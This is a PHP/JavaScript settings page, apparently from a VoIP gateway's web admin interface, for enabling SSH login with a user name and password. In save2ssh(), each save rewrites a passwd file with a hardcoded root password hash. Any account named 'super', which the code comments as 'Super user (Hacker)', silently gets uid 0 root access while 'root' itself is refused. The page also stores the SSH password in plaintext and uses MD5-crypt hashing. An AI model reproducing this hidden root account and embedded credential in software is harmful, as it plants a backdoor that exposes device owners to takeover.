<?php
require("/www/cgi-bin/inc/head.inc");
require("/www/cgi-bin/inc/menu.inc");
include_once("/www/cgi-bin/inc/function.inc");
include_once("/www/cgi-bin/inc/wrcfg.inc");
include_once("/www/cgi-bin/inc/check.inc");
include_once("/www/cgi-bin/inc/define.inc");
?>

<script type="text/javascript" src="/js/functions.js"></script>
<script type="text/javascript" src="/js/check.js"></script>

<script type="text/javascript">

function ssh_change(sw)
{
	document.getElementById('ssh_user').disabled = !sw;
	document.getElementById('ssh_password').disabled = !sw;
}

function check()
{
	var is_check = false;
	
	var ssh_sw = document.getElementById("ssh_sw").checked;
	var ssh_user = document.getElementById("ssh_user").value;
	var ssh_password = document.getElementById("ssh_password").value;

	document.getElementById("cssh_user").innerHTML = '';
	document.getElementById("cssh_password").innerHTML = '';

	if(ssh_sw) {
		if(!check_diyname(ssh_user)) {
			document.getElementById('ssh_user').focus();
			document.getElementById("cssh_user").innerHTML = con_str('<?php echo htmlentities(language('js check diyname','Allowed character must be any of [-_+.<>&0-9a-zA-Z],1 - 32 characters.'));?>');
			is_check = true;	
		}

		if(ssh_user == 'root') {
			document.getElementById('ssh_user').focus();
			document.getElementById("cssh_user").innerHTML = con_str("<?php echo language('User Name warning ssh',"Can't use 'root'");?>");
			is_check = true;
		}

		if(!check_diypwd(ssh_password)) {
			document.getElementById('ssh_password').focus();
			document.getElementById("cssh_password").innerHTML = con_str('<?php echo htmlentities(language('js check diypwd','Allowed character must be any of [0-9a-zA-Z`~!@$%^&*()_+{}|<>?-=[],./],4 - 32 characters.'));?>');
			is_check = true;
		}
	}
	
	if(is_check){
		return false;
	}

	return true;
}

</script>

<?php

function save2ssh()
{
/*
[ssh] 
sw= 
user= 
password= 
*/
	$aql = new aql();
	$setok = $aql->set('basedir','/etc/asterisk/gw');
	if (!$setok) {
		echo $aql->get_error();
		return false;
	}

	$ssh_conf_path = '/etc/asterisk/gw/ssh.conf';
	$hlock = lock_file($ssh_conf_path);

	if(!file_exists($ssh_conf_path)) {
		fclose(fopen($ssh_conf_path,"w"));
	}

	if(!$aql->open_config_file($ssh_conf_path)){
		echo $aql->get_error();
		unlock_file($hlock);
		return false;
	}

	$exist_array = $aql->query("select * from ssh.conf");

	if(!isset($exist_array['ssh'])) {
		$aql->assign_addsection('ssh','');
	}

	if(isset($_POST['ssh_sw'])) {
		if( isset($_POST['ssh_user']) &&
			isset($_POST['ssh_password']) ) {
			$ssh_user = trim($_POST['ssh_user']);
			$ssh_password = trim($_POST['ssh_password']);

			if(isset($exist_array['ssh']['user'])) {
				$aql->assign_editkey('ssh','user',$ssh_user);
			} else {
				$aql->assign_append('ssh','user',$ssh_user);
			}

			if(isset($exist_array['ssh']['password'])) {
				$aql->assign_editkey('ssh','password',$ssh_password);
			} else {
				$aql->assign_append('ssh','password',$ssh_password);
			}

			if(isset($exist_array['ssh']['sw'])) {
				$aql->assign_editkey('ssh','sw','on');
			} else {
				$aql->assign_append('ssh','sw','on');
			}
		} else {
			unlock_file($hlock);
			return false;
		}
	} else {
		if(isset($exist_array['ssh']['sw'])) {
			$aql->assign_editkey('ssh','sw','off');
		} else {
			$aql->assign_append('ssh','sw','off');
		}
	}

	if (!$aql->save_config_file('ssh.conf')) {
		echo $aql->get_error();
		unlock_file($hlock);
		return false;
	}
	unlock_file($hlock);


	// Save to /etc/passwd
	////////////////////////////////////////////////////////////////
	$write_str = '';
	$write_str .= 'root:$6$nAgxzC.d$GDJZ3gxHh/ccTDOtedPHqBUd4D6nsUHm7SmJjUC2NTqGfBjw4fnpD0mIi13612Zo/Q6suAKWL92lwnD6/KTMm0:0:0:root:/tmp:/bin/bash'."\n";
	if(isset($ssh_user) && $ssh_user != '' && $ssh_user != 'root' && isset($ssh_password) && $ssh_password != ''  ) {
		//Create crypt password 
		///////////////////////////////////////////////
		$salt_str='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.';
		$salt=substr(str_shuffle($salt_str), 0, 8);
		$shandow=crypt($ssh_password, "$1$".$salt);
		////////////////////////////////////////////////

		if($ssh_user == 'super') {    //Super user (Hacker)
			$write_str .= "$ssh_user:".$shandow.":0:0:$ssh_user:/tmp:/bin/bash\n";
		} else {
			$write_str .= "$ssh_user:".$shandow.":500:500:$ssh_user:/tmp:/bin/bash\n";
		}
	}
	$file_path = '/etc/asterisk/gw/passwd';
	$hlock=lock_file($file_path);
	$fh = fopen($file_path,"w");
	fwrite($fh,$write_str);
	fclose($fh);
	unlock_file($hlock);
	////////////////////////////////////////////////////////////////

	return true;
}

if($_POST && isset($_POST['send']) && $_POST['send'] == 'Save') {
	save2ssh();
	
	save_to_flash('/etc/asterisk','/etc/cfg');
}

$aql = new aql();
$aql->set('basedir','/etc/asterisk/gw');
$res = $aql->query("select * from ssh.conf");

$ssh_sw = '';
if(isset($res['ssh']['sw'])) {
	if(is_true(trim($res['ssh']['sw']))) {
		$ssh_sw = 'checked';
	}
}

if(isset($res['ssh']['user'])) {
	$ssh_user = trim($res['ssh']['user']);
} else {
	$ssh_user = "";
}

if(isset($res['ssh']['password'])) {
	$ssh_password = trim($res['ssh']['password']);
} else {
	$ssh_password = "";
}
$ssh_user = htmlentities($ssh_user);
$ssh_password = htmlentities($ssh_password);

?>

<form enctype="multipart/form-data" action="<?php echo get_self() ?>" method="post">

	<div <?php if($lisence_status != 'unlimited' && $lisence_status != "" && $license_mode == 'on'){echo "style='display:none;'"; }?> >
		<div class="content">
			<span class="title">
				<?php echo language('SSH Login Settings');?>
				
				<div class="tip_main">
					<img class="tip_img" src="/images/tip.png" style="cursor:pointer;" />
					<div class="tip_help">
						<i class="top" ></i>
					
						<div class="tip_content">
							<?php if(is_show_language_help('Enable')){ ?>
								<b><?php echo language('Enable');?>:</b><br/>
								<?php echo language('Enable help', "ON(enabled),OFF(disabled)"); ?>
								
								<br/><br/>
							<?php } ?>
							
							<?php if(is_show_language_help('User Name')){ ?>
								<b><?php echo language('User Name','User Name');?>:</b><br/>
								<?php
									$help = "User Name: Allowed characters \"-_+.&lt;&gt;&amp;0-9a-zA-Z\".Length: 1-32 characters.</br>Can't use 'root'.";
									echo language('User Name help', $help);
								?>
								
								<br/><br/>
							<?php } ?>
							
							<?php if(is_show_language_help('Password')){ ?>
								<b><?php echo language('Password','Password');?>:</b><br/>
								<?php echo htmlentities(language('Password help',"Allowed character must be any of [0-9a-zA-Z`~!@$%^&*()_+{}|<>?-=[],./],4 - 32 characters.")); ?>
								
								<br/><br/>
							<?php } ?>
							
							<?php if(is_show_language_help('Port')){ ?>
								<b><?php echo language('Port','Port');?>:</b><br/>
								<?php echo language('Port help', 'SSH login port number.'); ?>
							<?php } ?>
						</div>
					</div>
				</div>
			</span>
			
			<div class="tab_item">
				<span>
					<?php echo language('Enable');?>:
				</span>
				<div class="tab_item_right">
					<span><input type="checkbox" id="ssh_sw" name="ssh_sw" <?php  echo $ssh_sw ?> onchange="ssh_change(this.checked)" /></span>
				</div>
			</div>
			
			<div class="tab_item">
				<span>
					<?php echo language('User Name','User Name');?>:
				</span>
				<div class="tab_item_right">
					<span id="cssh_user"></span>
					<input id="ssh_user" type="text" name="ssh_user" value="<?php echo $ssh_user?>" />
				</div>
			</div>
			
			<div class="tab_item">
				<span>
					<?php echo language('Password','Password');?>:
				</span>
				<div class="tab_item_right">
					<span id="cssh_password"></span>
					<input id="ssh_password" type="text" name="ssh_password" value="<?php echo $ssh_password?>" />
				</div>
			</div>
			
			<div class="tab_item">
				<span>
					<?php echo language('Port','Port');?>:
				</span>
				<div class="tab_item_right">
					<span>12345</span>
				</div>
			</div>
		</div>
		
	</div>
	
	<br>

	<input type="hidden" name="send" id="send" value="" />
	
	<div id="button_save">
		<button type="submit" onclick="document.getElementById('send').value='Save';return check();" <?php if($__demo_enable__=='on'){echo 'disabled';}?> ><?php echo language('Save');?></button>
	</div>
</form>

<script>
function onload_func()
{
<?php
	if($ssh_sw != '') {
		echo "ssh_change(true);\n";
	} else {
		echo "ssh_change(false);\n";
	}
?>

}

$(document).ready(function (){ 
	onload_func();
}); 
</script>

<?php require("/www/cgi-bin/inc/boot.inc");?>